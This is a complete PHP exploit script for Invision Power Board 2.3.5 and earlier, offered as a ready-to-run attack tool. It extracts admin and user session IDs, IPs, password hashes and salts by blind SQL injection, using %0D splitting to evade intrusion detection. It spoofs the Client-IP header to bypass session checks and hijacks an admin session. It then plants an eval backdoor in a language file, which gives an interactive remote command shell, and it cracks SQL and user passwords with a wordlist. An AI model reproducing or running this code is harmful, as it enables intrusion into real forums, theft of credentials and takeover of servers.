#!/usr/bin/php -q
<?php
# This file requires the PhpSploit class.
# If you want to use this class, the latest
# version can be downloaded from acid-root.new.fr.
##################################################
error_reporting(E_ALL ^ E_NOTICE);
require('phpsploitclass.php'); # >= 2.1

# yeah ... it rox (:
class ipb_spl
{
	var $web;

	function main()
	{
		$this->mhead();
		
		# Gimme your args
		$this->p_attack = $this->get_p('attack', true);
		$this->p_prox   = $this->get_p('proxhost');
		$this->p_proxa  = $this->get_p('proxauth');
		
		$this->init_global();
		
		# Proxy params
		if( $this->p_prox )
		{
			$this->web->proxy($this->p_prox);
			
			if( $this->p_proxa )
			$this->web->proxyauth($this->p_proxa);
		}

		# Where do we go ?
		switch( $this->p_attack )
		{
			case 1:	 $this->code_exec();  break;
			case 2:  $this->bf_sql_pwd(); break;
			case 3:  $this->bf_usr_pwd(); break;
			default: $this->usage();
		}

		return;
	}
	
	function code_exec($loop=1)
	{
		# First loop
		if( $loop == 1 )
		{
			$this->set_sql_param();
			$this->set_sql_focus();
		
			$this->p_acp = $this->get_p('acp');
				
			# ACP path
			if( !$this->p_acp )
			{
				# If the user changed the ACP directory, we can
				# find it (if the "Remove ACP Link" option was not
				# applied) by log in as an Admin, and then click
				# on "Admin CP". This can be done with a user
				# but I didn't implemented that ;)
				$this->msg('Using default ACP path: admin', 1);
				$this->p_acp = 'admin';
			}
			else 
			$this->msg('Using ACP path "'.$this->p_acp.'"', 1);
		
			# Init client headers:
			# Only if we have the same IP as the targeted user (not admin),
			# it resets session datas, so we try to spoof our 
			# IP as a random one in order to keep user's session datas while
			# we bruteforce SQL fields.
			$this->bypass_matches();
		
			# Remove expired sessions ( time() - 60*60*2  =  > 2 hours )
			$this->web->get($this->p_url.$this->p_acp.'/index.php?');
			$this->msg('Removed all out of date admin sessions', 1);
		
			# Cookie prefix
			$this->get_cprefix();
		}
				
		# Admin session ?
		$this->msg('Trying to find an admin session id', 0);
		
		# Got one :]
		if( $this->get_admin_sess() )
		{
			$this->s_admin = true;
			$this->s_sess  = $this->data['a_sess_id'];
			$this->a_url   = $this->p_url.$this->p_acp.'/index.php?adsess='.$this->s_sess;
		}
		
		# Nothing special
		else 
		{
			$this->s_admin = false;
			$this->msg('No admin session id found', -1);
		}
		
		# User session ?
		if( !$this->s_sess )
		{
			$this->msg('Trying to find a user session id', 0);
			
			# Yep
			if( $this->get_user_sess() )
			$this->s_sess = $this->data['u_sess_id'];

			# F0ck
			else 
			{
				$this->msg('No user session id found', -1);
				$this->msg('Admin session > 2 hours or user logged out', 0);
				$this->msg('Keeping trying until the user connects', 0);
				$this->msg('Entering loop #'.$loop.' ...', 0);
				$this->code_exec(++$loop);
			}
		}
			
		$this->msg('Getting security options', 0);
		
		# Security options
		$this->get_sec_options();
		
		# IP filter ?
		if( $this->conf['ip'] === '1' )
		{
			$this->s_bypass = true;
			
			$this->msg('IP filter option is turned on', 0);
			
			# Spoofing protection ?
			if( !$this->conf['xforward'] )
			{
				# Assuming our IP isn't the same etc..
				$this->msg('Can\'t bypass the IP filter', -1);
				exit(1);
			}
			
			# X-Forwarded-For / Client-IP /
			# Proxy-User / X-Cluster-Client-IP
			else 
			{
				$this->msg('Cool, we can spoof our IP (Client-IP)', 1);
				
				if( $this->s_admin )
				{
					$this->msg('Trying to find admin\'s last IP', 0);
					
					# Admin IP found
					$this->get_admin_ip();
					$this->s_ip = $this->data['a_ip_addr'];
				}
				else 
				{
					$this->s_admin = false;
					$this->msg('Trying to find user\'s last used IP', 0);
					
					# User IP found
					$this->get_user_ip();
					$this->s_ip = $this->data['u_ip_addr'];
				}
				
				# Nothing found
				if( !$this->s_ip )
				{
					# Ahah (:
					$this->msg('No IP found for this user', -1);
					$this->give_hope();
				}
				
				# Got one !
				else
				$this->msg('Ok, using IP '.$this->s_ip, 1);
			}
		}
		
		# User-Agent filter ?
		if( $this->conf['browser'] === '1' && !$this->s_admin )
		{
			$this->s_bypass = true;
			
			$this->msg('Trying to find a valid user-agent', 0);
			
			# Good
			if( $this->get_user_agent() )
			{
				$this->msg('Ok, using user-agent '.substr($this->data['u_agent'], 0, 10).'...', 1);
				$this->s_agent = $this->data['u_agent'];
			}
			
			# WTF :!
			else
			{
				$this->msg('No user-agent found for this user', -1);
				$this->msg('Maybe the browser didn\'t send this header', 0);
				$this->s_agent = '';
			}
			
		}

		# Cool !?
		if( !$this->s_bypass )
		$this->msg('Cool, nothing to bypass', 1);
		
		$this->msg('Trying to log in', 0);
		
		# Owned =]
		if( $this->is_logged() )
		{
			# PHP code
			if( $this->s_admin )
			{
				$this->msg('Logged in with an admin session', 1);
				$this->exec_code();
			}
			
			# Normal user ?
			else
			{
				$this->msg('Logged in with a user session', 1);
				$this->msg('You can log in using the cookie session_id', 1);

				if( $this->s_ip !== $this->def_ip )
				$this->msg('Set the Client-IP header to: '.$this->s_ip, 1);
				
				if( $this->s_agent )
				$this->msg('Set the User-Agent header to: '.$this->s_agent, 1);
				
				exit(0);
			}
		}
		else 
		{
			# Even if the admin logged out .. the admin session
			# is still valid ;)
			$this->msg('Can\'t log in, the session has expired ?!', -1);
			$this->give_hope();
		}
		
		return;
	}
	
	function bf_sql_pwd()
	{
		$this->p_ip    = $this->get_p('ip', true);
		$this->p_dict  = $this->get_p('dict', true);
		
		$this->p_sql_u = $this->get_p('sqlusr');
		
		$this->p_url   = $this->get_p('url');
		$this->p_uname = $this->get_p('uname');
		$this->p_pwd   = $this->get_p('pwd');
		// or 
		$this->p_uid   = $this->get_p('uid');
		$this->p_hash  = $this->get_p('passhash');
		$this->p_shold = $this->get_p('stronghold');
		
		if( $this->p_uname && $this->p_pwd && $this->p_url )
		{
			$this->get_cprefix();
			
			$this->msg('Trying to get some cookies', 0);
			
			$g_dat = 'index.php?act=Login&CODE=01&CookieDate=1';
			$p_dat = 'UserName='.$this->p_uname.'&PassWord='.$this->p_pwd.'&x=0&y=0';
		
			$this->web->post($this->p_url.$g_dat, $p_dat);
		
			$this->p_uid   = $this->web->cookie[$this->s_cprefix.'member_id'];
			$this->p_hash  = $this->web->cookie[$this->s_cprefix.'pass_hash'];
			$this->p_shold = $this->web->cookie[$this->s_cprefix.'ipb_stronghold'];
		}
		elseif( !$this->p_uid || !$this->p_hash || !$this->p_shold )
		$this->usage();
		
		if( !$this->p_uid || !$this->p_hash || !$this->p_shold )
		{
			$this->msg('Can\'t get cookies', -1);
			$this->msg('You should try with other parameters', -1);
			exit(1);
		}
		
		$this->msg('Ok, using cookies:', 1);
		
		$this->msg('member_id='.$this->p_uid, 1);
		$this->msg('pass_hash='.$this->p_hash, 1);
		$this->msg('ipb_stronghold='.$this->p_shold, 1);
		
		if( !$this->p_sql_u )
		{
			$this->set_sql_param();
			
			$this->msg('Trying to get the current sql user', 0);
			
			if( !$this->get_sql_user() )
			{
				$this->msg('Can\'t get the sql user', -1);
				$this->msg('If you know the sql user, use -sqlusr', -1);
				exit(1);
			}
			else
			$this->p_sql_u = $this->data['sql_user'];
		}
		
		$this->msg('Ok, using sql user '.$this->p_sql_u, 1);
		
		$dico_c = file($this->p_dict);
		$ip_a   = explode('.', $this->p_ip);
		
		$this->msg('Entering local dictionnary attack ('.count($dico_c).' words)', 0);
		$this->msg('You should take a drink ...', 0);
		
		foreach( $dico_c as $line )
		{
			$md5 = md5(trim($line).$this->p_sql_u);
			$md5 = md5($this->p_uid.'-'.$ip_a[0].'-'.$ip_a[1].'-'.$this->p_hash).$md5;
			$md5 = md5($md5);

			if( $this->p_shold === $md5 )
			{
				$this->msg('Found something cool =]', 1);
				$this->msg('SQL password: '.$line, 1);
				exit(1);
			}

		}
		
		$this->msg('End of the wordlist, password not found', -1);
		
		return;
	}

	function bf_usr_pwd()
	{
		$this->p_dict  = $this->get_p('dict', true);

		$this->p_hash  = $this->get_p('passhash');
		$this->p_salt  = $this->get_p('salt');
		
		if( !$this->p_hash || !$this->p_salt )
		{
			$this->set_sql_param();
			$this->set_sql_focus();
		}
		
		if( !$this->p_hash )
		{
			$this->msg('Trying to get the password hash', 0);
			
			if( !$this->get_pass_hash() )
			{
				$this->msg('Can\'t get the password hash', -1);
				exit(1);
			}
			else 
			$this->p_hash = $this->data['pass_hash'];
		}
		
		$this->msg('Ok, using hash '.$this->p_hash, 1);
		
		if( !$this->p_salt )
		{
			$this->msg('Trying to get the password salt', 0);
			
			if( !$this->get_pass_salt() )
			{
				$this->msg('Can\'t get the password salt', -1);
				exit(1);
			}
			else 
			$this->p_salt = $this->data['pass_salt'];
		}
		
		$this->msg('Ok, using salt '.$this->p_salt, 1);
		
		$dico_c = file($this->p_dict);
		
		$this->msg('Entering local dictionnary attack ('.count($dico_c).' words)', 0);
		$this->msg('You should take a drink ...', 0);
		
		foreach( $dico_c as $line )
		{
			if( $this->p_hash === md5(md5($this->p_salt).md5(trim($line))) )
			{
				$this->msg('Found something cool =]', 1);
				$this->msg('User password: '.$line, 1);
				exit(1);
			}
		}
		
		$this->msg('End of the wordlist, password not found', -1);
		
		return;
	}
	
	function set_sql_param()
	{
		$this->p_url   = $this->get_p('url', true);
		$this->p_pre   = $this->get_p('prefix');
		
		# Table prefix
		if( !$this->p_pre )
		{
			# Default table prefix if not precised
			$this->msg('Using default table prefix: ibf_', 1);
			$this->p_pre = 'ibf_';
		}
		else 
		$this->msg('Using table prefix '.$this->p_pre, 1);

	}
	
	function set_sql_focus()
	{
		$this->p_uname = $this->get_p('uname');
		$this->p_uid   = $this->get_p('uid');
		
		if( $this->p_uname )
		$this->msg('Using targeted username '.$this->p_uname, 1);
		
		elseif( $this->p_uid )
		$this->msg('Using targeted user id '.$this->p_uid, 1);
		
		# Target
		if( !($this->p_uname || $this->p_uid) )
		{
			# Default uid if not precised
			$this->msg('Using default user id: 1', 1);
			$this->p_uid = 1;
		}

		# Focus on ?
		if( $this->p_uname )
		$this->t_on = 'members_l_username=\''.addslashes($this->p_uname).'\'';
		
		else 
		$this->t_on = 'id='.(int)$this->p_uid;
		
		return;
	}
	
	function exec_code()
	{
		$this->write_code();
		
		while( $this->cmd_prompt() )
		{
			$this->web->addheader('My-Code', $this->cmd);
			$this->web->get($this->p_url);

			print "\n".$this->get_answer();
		}
		
		exit(0);
	}
	
	function get_answer()
	{
		$res_a = explode($this->res_sep, $this->web->getcontent());
		
		if( !$res_a[1] )
		return 'No result to retrieve';
		
		else 
		return $res_a[1];
	}
	
	function cmd_prompt()
	{
		$this->cmd = $this->msg('root@ipb: ', 1, 1, 0, true);
		
		if( !ereg('^(quit|exit)$', $this->cmd) )
		{		
			$this->cmd = base64_encode($this->cmd);
			$this->cmd = str_replace('%CMD%', $this->cmd, $this->php_send);
			
			return TRUE;
		}

		else
		   return FALSE;
	}
	
	function write_code()
	{
		# Gimme the language ID
		$this->get_def_lang();
		
		# Current lang settings
		$p_dat =
		'code=edit2&act=lang&id='.$this->g_lid.'&section'.
		'=lookandfeel&lang_file=lang_boards.php';
		
		$this->web->post($this->a_url, $p_dat);

		# We collect each variable name / value
		if( preg_match_all($this->reg_lvar, $this->web->getcontent(), $l_vars) )
		{
			# POST data 
			$p_dat =
			'code=doedit&act=lang&id='.$this->g_lid.
			'&lang_file=lang_boards.php&section=lo'.
			'okandfeel&';

			# &Name=Value
			for( $i=0; $i<count($l_vars[0]); $i++ )
			{
				$p_dat .=
				'&XX_'.$l_vars[1][$i].'='.urlencode($l_vars[2][$i]);
				
				# We write our PHP code in the first variable
				if( $i == 0 )
				$p_dat .= $this->php_write;
			}
			
			# Go on
			$this->web->post($this->a_url, $p_dat);
			
			$this->msg('PHP code written', 1);
		}
		else
		{
			# WTF :!
			$this->msg('Can\'t find block variables', 0);
			exit(1);
		}
		
		return;
	}
	
	function get_def_lang()
	{
		$this->msg('Trying to get the set language id', 0);
		
		$this->web->get($this->a_url.'&section=lookandfeel&act=lang');
		
		if( preg_match($this->reg_lang, $this->web->getcontent(), $lids) )
		{
			$this->g_lid = $lids[1];
			$this->msg('Using language id '.$this->g_lid, 1);
		}
		else 
		{
			$this->msg('Can\'t get the default language id', -1);
			exit(1);
		}
		
		return;
	}
	
	function is_logged()
	{
		$this->bypass_matches();

		# User session ok ?
		if( !$this->s_admin )
		{
			$match = 'act=Login&amp;CODE=03';
			$this->web->addcookie($this->s_cprefix.'session_id', $this->s_sess);
			$this->web->get($this->p_url);
		}
		
		# Admin session ok ?
		else
		{
			$match = '&section=';
			$this->web->get($this->a_url);
		}
		
		if( preg_match("/$match/i", $this->web->getcontent()) )
		return true;
		
		else 
		return false;		
	}
	
	function bypass_matches()
	{
		# match_browser
		$this->web->agent($this->s_agent);
		
		# match_ipaddress
		$this->web->addheader('Client-IP', $this->s_ip);
		
		return;
	}
	
	function get_cprefix()
	{
		$this->msg('Trying to get the cookie prefix', 0);
				
		# Set-Cookie: session_id=...; path=/
		$this->web->get($this->p_url);
		
		$this->s_cprefix = '';
		
		if( $this->web->cookie )
		{
			foreach( $this->web->cookie as $name => $value)
			{
				if( preg_match($this->reg_cpre, $name, $cmatches) )
				{
					$this->s_cprefix = $cmatches[1];
					break;
				}
			}
		}
		
		if( !$this->s_cprefix )
		$this->msg('No cookie prefix set', 1);
		
		else 
		$this->msg('Using cookie prefix '.$this->s_cprefix, 1);
		
		return;
	}
	
	function get_sec_options()
	{
		# If no value, take the default one
		$this->get_conf('t.conf_value');
		$this->get_conf('t.conf_default');
		
		return;
	}
	
	function get_conf($field)
	{
		$this->init_sql();
		
		$this->t_table = 'conf_settings';	
		$this->t_field = $field;
		$this->t_char  = $this->chr_num;
		
		$this->t_add_0 = "AND t.conf_key='match_browser'";

		if( $this->conf['browser'] === '' )
		$this->conf['browser'] = $this->bf_inj();

		$this->t_add_0 = "AND t.conf_key='match_ipaddress'";
		
		if( $this->conf['ip'] === '' )
		$this->conf['ip'] = $this->bf_inj();
		
		$this->t_add_0 = "AND t.conf_key='xforward_matching'";
		
		if( $this->conf['xforward'] === '' )
		$this->conf['xforward'] = $this->bf_inj();

		return;
	}
	
	function get_login_key()
	{
		$this->init_sql();
		
		$this->t_key             = 'login_key';
		$this->t_table           = 'members';
		$this->t_field           = 't.member_login_key';
		$this->t_join            = 't.id=m.id';
		$this->t_char            = $this->chr_md5;
		$this->data['login_key'] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_sql_user()
	{
		$this->init_sql();
		
		$this->t_key             = 'user()';
		$this->t_table           = 'members';
		$this->t_field           = 'user()';
		$this->t_char            = $this->chr_all;
		$this->t_end             = '@';
		$this->data['sql_user']  = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_pass_hash()
	{
		$this->init_sql();
		
		$this->t_key             = 'pass_hash';
		$this->t_table           = 'members_converge';
		$this->t_field           = 't.converge_pass_hash';
		$this->t_join            = 't.converge_email=m.email';
		$this->t_char            = $this->chr_md5;
		$this->data['pass_hash'] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_pass_salt()
	{	
		$this->init_sql();
		
		$this->t_key             = 'pass_salt';
		$this->t_table           = 'members_converge';
		$this->t_field           = 't.converge_pass_salt';
		$this->t_join            = 't.converge_email=m.email';
		$this->t_char            = $this->chr_all;
		$this->data['pass_salt'] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_admin_sess()
	{
		$this->init_sql();
		
		$this->t_key             = 'admin_sid';
		$this->t_table           = 'admin_sessions';
		$this->t_field           = 't.session_id';
		$this->t_join            = 't.session_member_id=m.id';
		$this->t_sel             = 't.session_log_in_time';
		$this->t_char            = $this->chr_md5;
		$this->data['a_sess_id'] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_admin_ip()
	{
		$this->init_sql();
		
		$this->t_key             = 'admin_ip';
		$this->t_table           = 'admin_sessions';
		$this->t_field           = 't.session_ip_address';
		$this->t_join            = 't.session_member_id=m.id';
		$this->t_sel             = 't.session_log_in_time';
		$this->t_char            = $this->chr_ip;
		$this->data['a_ip_addr'] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_admin_pwd()
	{
		$this->init_sql();
		
		$this->t_key             = 'admin_pwd';
		$this->t_table           = 'admin_login_logs';
		$this->t_field           = 't.admin_post_details';
		$this->t_join            = 't.admin_username=m.members_l_username';
		$this->t_sel             = 't.admin_id';
		$this->t_end             = '"';
		$this->t_bchar           = -4; # ";}}
		$this->t_char            = $this->chr_all;
		$this->data['a_pwd_like']= $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_user_sess()
	{
		$this->init_sql();
		
		$this->t_key             = 'user_sid';
		$this->t_table           = 'sessions';
		$this->t_field           = 't.id';
		$this->t_join            = 't.member_id=m.id';
		$this->t_sel             = 't.running_time';
		$this->t_char            = $this->chr_md5;
		$this->data['u_sess_id'] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_user_ip()
	{
		$this->init_sql();
		
		$this->t_key             = 'user_ip';
		$this->t_table           = 'sessions';
		$this->t_field           = 't.ip_address';
		$this->t_join            = 't.member_id=m.id';
		$this->t_sel             = 't.running_time';
		$this->t_char            = $this->chr_ip;
		$this->data['u_ip_addr'] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_user_agent()
	{
		$this->init_sql();
		
		$this->t_key             = 'user_agent';
		$this->t_table           = 'sessions';
		$this->t_field           = 't.browser';
		$this->t_join            = 't.member_id=m.id';
		$this->t_sel             = 't.running_time';
		$this->t_char            = $this->chr_all;
		$this->data['u_agent']   = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function init_sql()
	{
		# SQL Injection params
		$this->t_end   = null;
		$this->t_add_0 = '';
		$this->t_add_1 = '';
		$this->t_sel   = '1';
		$this->t_bchar = 0;
		$this->t_join  = '';
		$this->t_key   = '';
		$this->t_add_1 = 'ORDER BY id DESC LIMIT 1';
		
		return;
	}
	
	function init_global()
	{
		# Charsets
		$this->chr_spe = str_split(' :/;*(-.!,?§*µù%$£^¨=+})°]àç^_\\`è|[\'{#é~&²"@');
		$this->chr_num = range(0, 9);
		$this->chr_md5 = array_merge( $this->chr_num, range('a', 'f') );
		$this->chr_ip  = array_merge( $this->chr_num, array('.') );
		$this->chr_all = array_merge( $this->chr_num, range('a', 'z') );
		$this->chr_all = array_merge( range('A', 'Z'), $this->chr_all, $this->chr_spe );

		# SQL Injection
		$this->def_param = 'index.php?s=&act=xmlout&do=check-display-name&name=%rep_inj%';
	
		# IDS Evasion via %0D
		$this->def_inj   = "' OR 1=\"'\" U%0DNION %rep_req% OR 1=\"'\" %rep_add% #";
		
		# Results
		$this->data = array();
		$this->conf = array('ip' => '', 'browser' => '', 'xforward' => '');
		
		# Misc
		$this->stat     = array(-1 => '-', 0 => '/', 1 => '+');
		$this->s_bypass = false;
		$this->res_sep  = md5(rand());
		$this->def_ip   = rand(0,255).'.'.rand(0,255).'.'.rand(0,255).'.'.rand(0,255);
		
		# PHP Code
		$this->php_write = '${${@eval($_SERVER[HTTP_MY_CODE])}}';
		$this->php_send	 = "print('$this->res_sep');@system(base64_decode('%CMD%'));";
		$this->php_send .= "print('$this->res_sep');exit(0);";
		
		# Regex
		$this->reg_lang = '#</span></td>[\r\n]*.*[\r\n]*.*code=export&id=([0-9]+)#i';
		$this->reg_lvar = "#id='XX_([\w]+)'[\x20]+class='multitext'>(.*)</textarea></td>#i";
		$this->reg_cpre = '#^(.*)session_id$#';
		# $this->reg_acp  = '#<a href="(.*)"[\x20]+target="_blank"#i';
		
		# Default client headers
		$this->s_agent = 'Mozilla Firefox';
		$this->s_ip    = $this->def_ip;
		
		return;
	}
	
	function bf_inj()
	{
		$this->sub_chr = $this->t_bchar;
		$this->key_val = '';
			
		if( !empty($this->t_key) )
		$this->msg('', 0);
		
		while( true )
		{
			if( $this->t_bchar < 0 )
			$this->sub_chr--;
			
			else
			$this->sub_chr++;
	
			# 0-9a-f
			for( $j=0;$j<=count($this->t_char);$j++ )
			{
				# That one ?
				$chr = $this->t_char[$j];
				
				# Latest char ?
				if( $j === count($this->t_char) )
				$chr = $this->t_end;
				
				# Ascii num
				$asc = ord($chr);
				
				# Screen bug
				if( !empty($this->t_key) ) 
				{
					$msg  = $this->t_key.'='.$this->key_val;
					$msg .= ($chr === $this->t_end ? "\x20" : $chr);
					
					$this->msg($msg, 0, 1, 1);
				}
				
				# Focus on the target ?
				if( !empty($this->t_join) )
				{
					$inj = 
					'SEL%0DECT 1,'.$this->t_sel.' FR%0DOM '.$this->p_pre.$this->t_table.
					' t, '.$this->p_pre.'members m WH%0DERE '.$this->t_join.
					' AND m.'.$this->t_on.' AND ASC%0DII(SUBS%0DTR('.$this->t_field.
					','.$this->sub_chr.',1))='.$asc.' '.$this->t_add_0;
				}
				else 
				{
					$inj =
					'SEL%0DECT 1,'.$this->t_sel.' FR%0DOM '.$this->p_pre.$this->t_table.
					' t WH%0DERE ASC%0DII(SUB%0DSTR('.$this->t_field.','.$this->sub_chr.
					',1))='.$asc.' '.$this->t_add_0;
				}

				# SQL Injection via rawurldecode()
				$inj = str_replace('%rep_req%', $inj, $this->def_inj);
				$inj = str_replace('%rep_add%', $this->t_add_1, $inj);
				$inj = str_replace(array('"', "'"), array('%2522', '%2527'), $inj);
				
				# Params
				$inj = str_replace('%rep_inj%', $inj, $this->def_param);
				$inj = str_replace(array(' ', '#'), array('%20', '%23'), $inj);
				
				$this->web->get($this->p_url.$inj);

				# Ok !?
				if( !strstr($this->web->getcontent(), 'notfound') )
				{
					if( $chr !== $this->t_end )
					{	
						$this->key_val .= $chr;
						break;
					}
				}
				
				# End
				if( $chr === $this->t_end )
				{
					# Reverse
					if( $this->t_bchar < 0 )
					$this->key_val = strrev($this->key_val);
					
					if( !empty($this->t_key) ) 
					$this->msg($this->t_key.'='.$this->key_val, 1, 1, 1);

					return $this->key_val;
				}
			}
		}
		
	}
	
	function get_p($p, $exit=false)
	{
		global $argv;
		
		foreach( $argv as $key => $value )
		{
			if( $value === '-'.$p )
			{
				if( isset($argv[$key+1]) && !empty($argv[$key+1]) )
				{					
					return $argv[$key+1];
				}
				else
				{
					if( $exit )
					$this->usage();
					
					return true;
				}
			}
		}
		
		if( $exit )
		$this->usage();
		
		return false;
	}
	
	function msg($msg, $nstatus, $nspace=1, $ndel=0, $ask=false)
	{
		if( $ndel ) $type = "\r";
		else        $type = "\n";
		
		# wtf (:
		print
		(
			$type.str_repeat("\x20", $nspace).
			$this->stat[$nstatus]."\x20".$msg
		);
		
		if( $ask )
		return trim(fgets(STDIN));
	}
	
	function give_hope()
	{				
		$this->msg('You should try with another user or try another time', -1);
			
		exit(1);
	}
	
	function mhead()
	{
		# Advisory: http://acid-root.new.fr/?0:18
		
		print "\n Invision Power Board <= 2.3.5 Multiple Vulnerabilities";
		print "\n ------------------------------------------------------";
		print "\n\n About:";
		print "\n\n by DarkFig < gmdarkfig (at) gmail (dot) com >";
		print "\n http://acid-root.new.fr/";
		print "\n #acidroot@irc.worldnet.net";
		print "\n\n\n Attack(s):\n";
		
		return;
	}
	
	function usage()
	{

		print "\n -attack <int_choice> <params> [options]\n\n";
		print "  1 - PHP code execution\n\n";
		print "    -url        IPB url with ending slash\n\n";
		print "    -uname      targeted username\n";
		print "    -uid        OR the targeted user id (def: 1)\n\n";
		print "    -prefix     sql table prefix (def: ibf_)\n";
		print "    -acp        admin control panel path (def: admin)\n\n\n";
		print "  2 - Insecure SQL password usage\n\n";
		print "    -ip         your current IP\n";
		print "    -dict       a wordlist file\n\n";
		print "    -url        IPB url with ending slash\n";
		print "    -uname      a valid member username\n";
		print "    -pwd        the associated password\n\n";
		print "    -uid        OR  the targeted member id\n";
		print "    -passhash   the passhash cookie value\n";
		print "    -stronghold the stronghold cookie value\n\n";
		print "    -sqlusr     you can precise the sql user\n";
		print "    -prefix     sql table prefix (def: ibf_)\n\n\n";
		print "  3 - Password bruteforcer\n\n";
		print "    -dict       a wordlist file\n\n";
		print "    -url        IPB url with ending slash\n";
		print "    -uname      targeted username\n";
		print "    -uid        OR  the targeted user id (def: 1)\n";
		print "    -prefix     sql table prefix (def: ibf_)\n\n";
		print "    -passhash   OR the passhash value\n";
		print "    -salt       the salt value\n\n\n";
		print "  Optional: \n\n";
		print "    -proxhost <ip>       if you wanna use a proxy\n";
		print "    -proxauth <usr:pwd>  proxy with authentication\n";
		
		exit(1);
	}
	
}

$web = new phpsploit;
$web->cookiejar(1);
$web->agent('Mozilla Firefox');

$ipb = new ipb_spl;
$ipb->web =& $web;
$ipb->main();

?>